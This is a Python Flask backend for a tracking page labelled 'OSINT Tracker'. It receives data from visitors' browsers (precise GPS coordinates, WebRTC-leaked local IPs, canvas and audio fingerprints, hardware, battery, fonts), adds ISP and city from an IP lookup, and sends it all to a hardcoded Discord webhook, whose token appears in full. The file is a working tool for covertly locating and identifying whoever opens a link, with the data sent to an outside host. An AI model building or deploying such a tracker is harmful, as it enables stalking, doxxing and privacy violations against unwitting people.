from flask import Flask, request, jsonify, send_file
import json
import datetime
import requests

app = Flask(__name__)

# Your Discord webhook URL
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536189236431290369/lAIwbt_ESg5gor_CXxkx7WbR8Sjol7lMtg_EeWVYBJaiK8c_8znAEXMPGUxQxrwF5deB"

@app.route('/')
def serve_index():
    return send_file('../static/index.html')

@app.route('/track', methods=['POST'])
def track_data():
    data = request.json
    print("Data received:", json.dumps(data, indent=2))
    
    # Get IP from request
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    # Try to get IP intelligence
    ip_info = {}
    try:
        response = requests.get(f'http://ip-api.com/json/{client_ip}', timeout=5)
        if response.status_code == 200:
            ip_data = response.json()
            if ip_data.get('status') == 'success':
                ip_info = {
                    'ip': ip_data.get('query'),
                    'country': ip_data.get('country'),
                    'region': ip_data.get('regionName'),
                    'city': ip_data.get('city'),
                    'zip': ip_data.get('zip'),
                    'isp': ip_data.get('isp'),
                    'org': ip_data.get('org'),
                    'as': ip_data.get('as'),
                    'timezone': ip_data.get('timezone')
                }
    except Exception as e:
        print(f"IP lookup failed: {e}")
    
    data['ipInfo'] = ip_info
    data['clientIp'] = client_ip
    
    # Send to Discord with compact formatting
    send_to_discord(data)
    
    return jsonify({"status": "success", "discord_sent": True})

def send_to_discord(data):
    """Send compact but comprehensive data to Discord"""
    
    location = data.get('location', {})
    ip_info = data.get('ipInfo', {})
    screen = data.get('screen', {})
    battery = data.get('battery', {})
    webrtc = data.get('webRTCIPs', [])
    perf = data.get('performance', {})
    hw = data.get('hardware', {})
    fonts = data.get('fonts', [])
    plugins = data.get('plugins', [])
    
    # Build compact message
    lines = []
    lines.append("📍 **OSINT Package**")
    lines.append("")
    
    # Location - compact
    if location and location.get('latitude'):
        lat = location.get('latitude')
        lng = location.get('longitude')
        acc = location.get('accuracy', 'N/A')
        lines.append(f"📍 `{lat}, {lng}` ±{acc}m")
        lines.append(f"🔗 https://maps.google.com/?q={lat},{lng}")
    else:
        lines.append(f"📍 ❌ {location.get('error', 'Not shared')}")
    lines.append("")
    
    # IP Intelligence - compact
    if ip_info:
        parts = []
        if ip_info.get('ip'): parts.append(ip_info['ip'])
        if ip_info.get('city'): parts.append(f"🏙️{ip_info['city']}")
        if ip_info.get('country'): parts.append(ip_info['country'])
        if ip_info.get('isp'): parts.append(f"📡{ip_info['isp'][:20]}")
        lines.append("🌐 " + " | ".join(parts))
        lines.append("")
    
    # Browser & Device - compact
    browser_parts = []
    browser_parts.append(f"🖥️{data.get('platform', 'N/A')}")
    browser_parts.append(f"🌍{data.get('language', 'N/A')}")
    if hw.get('hardwareConcurrency'):
        browser_parts.append(f"⚡{hw['hardwareConcurrency']}c")
    if hw.get('deviceMemory'):
        browser_parts.append(f"💾{hw['deviceMemory']}GB")
    lines.append(" | ".join(browser_parts))
    lines.append("")
    
    # Screen - compact
    lines.append(f"📺 {screen.get('width', 'N/A')}x{screen.get('height', 'N/A')} @{screen.get('pixelRatio', 'N/A')}x")
    lines.append("")
    
    # WebRTC Leak
    if webrtc and webrtc[0] not in ['No local IPs found', 'WebRTC not supported']:
        lines.append(f"🔓 {', '.join(webrtc)}")
        lines.append("")
    
    # Fingerprints - compact
    lines.append(f"🆔 Canvas: `{data.get('canvasFingerprint', 'N/A')[:8]}`")
    lines.append(f"🆔 Audio: `{data.get('audioFingerprint', 'N/A')[:8]}`")
    lines.append("")
    
    # Battery - compact
    if battery:
        battery_parts = []
        if battery.get('level'): battery_parts.append(f"{battery['level']}")
        if battery.get('charging') is not None: 
            battery_parts.append("⚡" if battery['charging'] else "🔋")
        lines.append(f"🔋 " + " ".join(battery_parts))
        lines.append("")
    
    # Performance - compact
    perf_parts = []
    if perf.get('loadTime') and perf['loadTime'] != 'N/A':
        perf_parts.append(f"⏱️{perf['loadTime']}ms")
    if perf.get('dns') and perf['dns'] != 'N/A':
        perf_parts.append(f"DNS:{perf['dns']}ms")
    if perf.get('ttfb') and perf['ttfb'] != 'N/A':
        perf_parts.append(f"TTFB:{perf['ttfb']}ms")
    if perf_parts:
        lines.append("⚡ " + " | ".join(perf_parts))
        lines.append("")
    
    # Timezone & Session - compact
    lines.append(f"🕐 {data.get('timezone', 'N/A')} | {data.get('timestamp', 'N/A')[:19]}")
    lines.append(f"🆔 {data.get('sessionId', 'N/A')}")
    lines.append("")
    
    # Fonts - compact (show first 10)
    if fonts:
        font_list = ', '.join(fonts[:10])
        if len(fonts) > 10:
            font_list += f" +{len(fonts)-10} more"
        lines.append(f"📝 {font_list}")
        lines.append("")
    
    # Plugins - compact (show first 5)
    if plugins:
        plugin_list = ', '.join(plugins[:5])
        if len(plugins) > 5:
            plugin_list += f" +{len(plugins)-5} more"
        lines.append(f"🧩 {plugin_list}")
        lines.append("")
    
    # Referrer - compact
    if data.get('referrer') and data['referrer'] != 'Direct':
        lines.append(f"🔗 {data['referrer'][:50]}")
        lines.append("")
    
    # Send to Discord
    payload = {
        "content": "\n".join(lines),
        "username": "OSINT Tracker"
    }
    
    try:
        response = requests.post(DISCORD_WEBHOOK, json=payload, timeout=10)
        print(f"Discord status: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

app = app
